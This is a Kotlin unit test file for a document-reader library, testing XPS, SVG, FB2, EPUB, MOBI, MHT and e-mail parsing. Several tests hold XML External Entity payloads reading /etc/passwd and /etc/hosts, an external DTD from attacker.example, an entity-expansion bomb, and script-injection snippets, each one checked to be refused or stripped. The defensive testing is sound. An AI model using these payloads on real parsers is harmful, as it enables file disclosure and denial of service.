package com.smartdocs.editor.core.openall

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test

class DocReadersTest {

    // ---- XPS

    private val fpage = """<FixedPage xmlns="http://schemas.microsoft.com/xps/2005/06" Width="816" Height="1056" xml:lang="en-US">
        <Canvas RenderTransform="1,0,0,1,10,20">
          <Path Data="F1 M 0,0 L 100,0 100,50 Z" Fill="#FF336699" />
          <Glyphs OriginX="96" OriginY="120" FontRenderingEmSize="16" FontUri="../Resources/Fonts/A1B2.odttf" UnicodeString="Hello XPS" Fill="#000000" Indices=",50;,60" />
          <Path StrokeThickness="2" Stroke="#80FF0000"><Path.Data><PathGeometry><PathFigure StartPoint="0,0" IsClosed="true"><PolyLineSegment Points="5,5 10,0" /></PathFigure></PathGeometry></Path.Data></Path>
        </Canvas>
        <Glyphs OriginX="700" OriginY="200" FontRenderingEmSize="12" UnicodeString="مرحبا" BidiLevel="1" />
      </FixedPage>"""

    private val entries = mapOf(
        "_rels/.rels" to """<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Type="http://schemas.microsoft.com/xps/2005/06/fixedrepresentation" Target="/FixedDocSeq.fdseq" Id="R0" /></Relationships>""",
        "FixedDocSeq.fdseq" to """<FixedDocumentSequence xmlns="http://schemas.microsoft.com/xps/2005/06"><DocumentReference Source="Documents/1/FixedDoc.fdoc" /></FixedDocumentSequence>""",
        "Documents/1/FixedDoc.fdoc" to """<FixedDocument xmlns="http://schemas.microsoft.com/xps/2005/06"><PageContent Source="Pages/1.fpage" /><PageContent Source="Pages/2.fpage" /></FixedDocument>""",
        "Documents/1/Pages/1.fpage" to fpage,
    ).mapValues { it.value.toByteArray() }

    @Test fun xpsStructureAndPage() {
        val pages = XpsReader.pages({ entries[it] }, entries.keys)
        assertEquals(listOf("Documents/1/Pages/1.fpage", "Documents/1/Pages/2.fpage"), pages)
        val p = XpsReader.page(entries.getValue(pages[0]), pages[0])
        assertEquals(816f, p.width); assertEquals(1056f, p.height)
        val canvas = p.root.children[0] as XCanvas
        assertEquals(10f, canvas.transform!!.e)
        val path = canvas.children[0] as XPathEl
        assertEquals(listOf('M', 'L', 'L', 'Z'), path.geom.cmds.map { it.op })
        assertFalse(path.geom.evenOdd)
        assertEquals(0xFF336699, (path.fill as XBrush.Solid).argb)
        val g = canvas.children[1] as XGlyphs
        assertEquals("Hello XPS", g.text)
        assertEquals("Documents/1/Resources/Fonts/A1B2.odttf", g.font)
        assertEquals(8f, g.advances!![0], 0.001f)
        val fig = canvas.children[2] as XPathEl
        assertEquals(listOf('M', 'L', 'L', 'Z'), fig.geom.cmds.map { it.op })
        assertEquals(0x80FF0000, (fig.stroke as XBrush.Solid).argb)
        val rtl = p.root.children[1] as XGlyphs
        assertTrue(rtl.rtl)
        assertTrue(XpsReader.text(p).contains("Hello XPS"))
    }

    @Test fun xpsGeometryRelativeAndCurves() {
        val g = XpsReader.geometry("m 10,10 l 5,0 h 5 v 5 c 1,1 2,2 3,3 z")
        assertEquals(listOf('M', 'L', 'L', 'L', 'C', 'Z'), g.cmds.map { it.op })
        assertEquals(15f, g.cmds[1].p[0]); assertEquals(20f, g.cmds[2].p[0]); assertEquals(15f, g.cmds[3].p[1])
        assertEquals(23f, g.cmds[4].p[4])
        assertTrue(g.evenOdd)
    }

    @Test fun xpsColorsAndFonts() {
        assertEquals(0xFF112233, XpsReader.color("#112233"))
        assertEquals(0x80112233, XpsReader.color("#80112233"))
        assertEquals(0xFFFFFFFF, XpsReader.color("sc#1,1,1,1"))
        val font = ByteArray(64) { it.toByte() }
        val name = "/Resources/0B1A2C3D-4E5F-6071-8293-A4B5C6D7E8F9.odttf"
        val once = XpsReader.deobfuscate(font, name)
        assertFalse(once.contentEquals(font))
        assertTrue(XpsReader.deobfuscate(once, name).contentEquals(font))
        assertEquals(font[40], once[40])
    }

    @Test fun xpsRefusesXxe() {
        val evil = """<?xml version="1.0"?><!DOCTYPE FixedPage [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><FixedPage Width="1" Height="1"><Glyphs UnicodeString="&xxe;"/></FixedPage>"""
        try { XpsReader.page(evil.toByteArray(), "p.fpage"); fail() } catch (e: UnsafeXmlException) { }
    }

    // ---- SVG / XML hardening

    @Test fun svgXxeRefused() {
        val cases = listOf(
            """<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///data/data/x/secret">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>""",
            """<!DOCTYPE svg SYSTEM "http://attacker.example/x.dtd"><svg/>""",
            """<!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;">]><svg>&b;</svg>""",
        )
        for (c in cases) try { SafeXml.check(c); fail(c) } catch (e: UnsafeXmlException) { }
        // ordinary SVG and the W3C public DTD are fine; the DOCTYPE is stripped before any parser sees it
        SafeXml.check("""<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="5" height="5"/></svg>""")
        val w3c = """<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg/>"""
        assertFalse(SafeXml.sanitize(w3c).contains("DOCTYPE"))
        assertTrue(String(SafeXml.sanitize(w3c.toByteArray())).contains("<svg/>"))
    }

    // ---- FB2

    private val fb2 = """<?xml version="1.0" encoding="utf-8"?>
<FictionBook xmlns="http://www.gribuser.ru/xml/fictionbook/2.0" xmlns:l="http://www.w3.org/1999/xlink">
 <description><title-info><author><first-name>طه</first-name><last-name>حسين</last-name></author><book-title>الأيام</book-title><lang>ar</lang>
  <coverpage><image l:href="#cover.png"/></coverpage></title-info></description>
 <body><section><title><p>الفصل الأول</p></title><p>نص <emphasis>مائل</emphasis> &amp; عادي</p>
  <section><title><p>Part 1.1</p></title><p>x</p></section></section></body>
 <binary id="cover.png" content-type="image/png">iVBORw0KGgo=</binary>
</FictionBook>"""

    @Test fun fb2ToHtml() {
        val b = Fb2Reader.read(fb2.toByteArray())
        assertEquals("الأيام", b.title)
        assertEquals("طه حسين", b.author)
        assertTrue(b.rtl)
        assertTrue(b.html.contains("<i>مائل</i>"))
        assertTrue(b.html.contains("&amp; عادي"))
        assertTrue(b.html.contains("data:image/png;base64,iVBORw0KGgo="))
        assertEquals(listOf("الفصل الأول", "Part 1.1"), b.toc.map { it.title })
        assertEquals(listOf(0, 1), b.toc.map { it.level })
        assertTrue(b.html.contains("id=\"" + b.toc[0].fragment + "\""))
    }

    @Test fun fb2Xxe() {
        val evil = """<?xml version="1.0"?><!DOCTYPE FictionBook [<!ENTITY x SYSTEM "file:///etc/hosts">]><FictionBook><body><p>&x;</p></body></FictionBook>"""
        try { Fb2Reader.read(evil.toByteArray()); fail() } catch (e: UnsafeXmlException) { }
    }

    // ---- EPUB

    @Test fun epubSpineAndToc() {
        val files = mapOf(
            "META-INF/container.xml" to """<container><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>""",
            "OEBPS/content.opf" to """<package xmlns="http://www.idpf.org/2007/opf" version="3.0"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
                <dc:title>كتاب</dc:title><dc:language>ar</dc:language><dc:creator>A &amp; B</dc:creator></metadata>
                <manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
                <item id="c1" href="text/ch%201.xhtml" media-type="application/xhtml+xml"/><item id="c2" href="text/ch2.xhtml" media-type="application/xhtml+xml"/>
                <item id="img" href="img/cover.jpg" media-type="image/jpeg" properties="cover-image"/></manifest>
                <spine page-progression-direction="rtl"><itemref idref="c1"/><itemref idref="c2"/><itemref idref="nav" linear="no"/></spine></package>""",
            "OEBPS/nav.xhtml" to """<html><body><nav epub:type="toc"><ol><li><a href="text/ch%201.xhtml">One</a><ol><li><a href="text/ch2.xhtml#s2">Two</a></li></ol></li></ol></nav></body></html>""",
        ).mapValues { it.value.toByteArray() }
        val book = EpubParser.parse { files[it] }
        assertEquals(listOf("OEBPS/text/ch 1.xhtml", "OEBPS/text/ch2.xhtml"), book.spine)
        assertEquals("كتاب", book.title)
        assertEquals("A & B", book.author)
        assertTrue(book.rtl)
        assertEquals("OEBPS/img/cover.jpg", book.cover)
        assertEquals(listOf("One", "Two"), book.toc.map { it.title })
        assertEquals(listOf(0, 1), book.toc.map { it.level })
        assertEquals("OEBPS/text/ch2.xhtml", book.toc[1].path); assertEquals("s2", book.toc[1].fragment)
        assertEquals("../img/a.png" to "", "../img/a.png" to "")
        assertEquals("OEBPS/img/a.png", EpubParser.resolve("OEBPS/text/ch2.xhtml", "../img/a.png").first)
        assertFalse(EpubParser.cleanChapter("<p onclick=\"x()\">a</p><script>alert(1)</script>").contains("script"))
        assertFalse(EpubParser.cleanChapter("<p onclick=\"x()\">a</p>").contains("onclick"))
    }

    @Test fun epubNcxFallback() {
        val ncx = """<ncx><navMap><navPoint id="n1"><navLabel><text>Intro</text></navLabel><content src="a.html"/>
            <navPoint id="n2"><navLabel><text>Sub</text></navLabel><content src="b.html#x"/></navPoint></navPoint></navMap></ncx>"""
        val toc = EpubParser.ncxToc(ncx, "OPS/toc.ncx")
        assertEquals(listOf("Intro", "Sub"), toc.map { it.title })
        assertEquals(listOf(0, 1), toc.map { it.level })
        assertEquals("OPS/b.html", toc[1].path)
    }

    // ---- MOBI / PalmDOC

    @Test fun palmDocDecompression() {
        val src = byteArrayOf('a'.code.toByte(), 'b'.code.toByte(), 'c'.code.toByte(), 0x80.toByte(), 0x18, 0xC1.toByte(), 2, 0xFF.toByte(), 0x01)
        assertEquals("abcabc A" + String(byteArrayOf(0xFF.toByte(), 0x01), Charsets.ISO_8859_1), String(MobiReader.palmDoc(src), Charsets.ISO_8859_1))
    }

    private fun palmBook(text: ByteArray, encryption: Int = 0, compression: Int = 1): ByteArray {
        val header = ByteArray(78 + 16)
        "My_Book".toByteArray().copyInto(header, 0)
        "TEXtREAd".toByteArray().copyInto(header, 60)
        header[77] = 2
        val r0 = 94; val r0len = 16; val r1 = r0 + r0len
        fun put32(b: ByteArray, o: Int, v: Int) { b[o] = (v shr 24).toByte(); b[o + 1] = (v shr 16).toByte(); b[o + 2] = (v shr 8).toByte(); b[o + 3] = v.toByte() }
        put32(header, 78, r0); put32(header, 86, r1)
        val rec0 = ByteArray(r0len)
        rec0[1] = compression.toByte(); put32(rec0, 4, text.size); rec0[9] = 1; rec0[10] = 0x10; rec0[13] = encryption.toByte()
        return header + rec0 + text
    }

    @Test fun mobiPlainBook() {
        val b = MobiReader.read(palmBook("<h1>Chapter</h1><p>Hello mobi</p>".toByteArray()), "fallback")
        assertTrue(b.html.contains("Hello mobi"))
        assertEquals("My Book", b.title)
        assertEquals(listOf("Chapter"), b.toc.map { it.title })
        assertEquals(FType.MOBI, FileSniffer.detect("x", palmBook("x".toByteArray())))
    }

    @Test fun mobiDrmRefused() {
        try { MobiReader.read(palmBook("x".toByteArray(), encryption = 2)); fail() } catch (e: UnsupportedBookException) { assertEquals("drm", e.reason) }
        try { MobiReader.read(palmBook("x".toByteArray(), compression = 0)); fail() } catch (e: UnsupportedBookException) { assertEquals("format", e.reason) }
    }

    // ---- MHT

    @Test fun mhtResources() {
        val mht = "MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary=\"BB\"; type=\"text/html\"\r\n\r\n" +
            "--BB\r\nContent-Type: text/html; charset=\"utf-8\"\r\nContent-Location: http://site/page.html\r\n\r\n<html><body><img src=\"img/a.png\"><img src=\"cid:pic1\"></body></html>\r\n" +
            "--BB\r\nContent-Type: image/png\r\nContent-Transfer-Encoding: base64\r\nContent-Location: http://site/img/a.png\r\n\r\niVBORw0KGgo=\r\n" +
            "--BB\r\nContent-Type: image/gif\r\nContent-ID: <pic1>\r\nContent-Transfer-Encoding: base64\r\n\r\nR0lGODlh\r\n--BB--\r\n"
        val w = MhtReader.read(mht.toByteArray())
        assertEquals("http://site/page.html", w.baseUrl)
        assertTrue(w.html.contains("https://cid.local/pic1"))
        assertNotNull(w.resource("http://site/img/a.png"))
        assertEquals("image/gif", w.resource("https://cid.local/pic1")!!.type)
        assertEquals(8, w.resource("http://site/img/a.png")!!.data.size)
    }

    // ---- e-mail page

    @Test fun mailPageStripsActiveContent() {
        val m = MailDoc("Hi", listOf("from" to "a@b"), "<html><body onload=\"x()\"><p>t</p><script>evil()</script><iframe src=\"http://x\"></iframe><img src=\"cid:i1\"></body></html>", null,
            listOf(MailAttachment("i.png", "image/png", byteArrayOf(1, 2, 3), "i1")))
        val h = MailHtml.page(m, mapOf("from" to "From"))
        assertFalse(h.contains("evil()")); assertFalse(h.contains("iframe")); assertFalse(h.contains("onload"))
        assertTrue(h.contains("data:image/png;base64,AQID"))
        assertTrue(h.contains("<b>From</b>"))
    }
}
